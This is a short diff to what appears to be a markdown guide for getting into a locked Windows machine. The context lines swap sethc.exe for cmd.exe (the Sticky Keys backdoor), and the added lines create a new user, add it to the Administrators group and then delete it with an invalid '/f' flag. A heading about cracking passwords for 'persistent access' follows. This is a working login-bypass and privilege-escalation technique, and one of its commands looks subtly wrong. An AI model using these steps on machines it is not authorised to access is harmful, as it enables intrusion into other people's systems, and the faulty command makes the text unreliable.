@@ -16,7 +16,9 @@ cp /mnt/Windows/System32/sethc.exe /mnt/Windows/System32/sethc_old.exe
 cp /mnt/Windows/system32/cmd.exe /mnt/Windows/System32/sethc.exe
 
 # boot windows + press shift 5 times
-net user user new_password
+net user new_user new_password /add
+net localgroup Administrators new_user /add
+net user new_user /delete /f
 ```
 
 ### Crack password (persistent access)
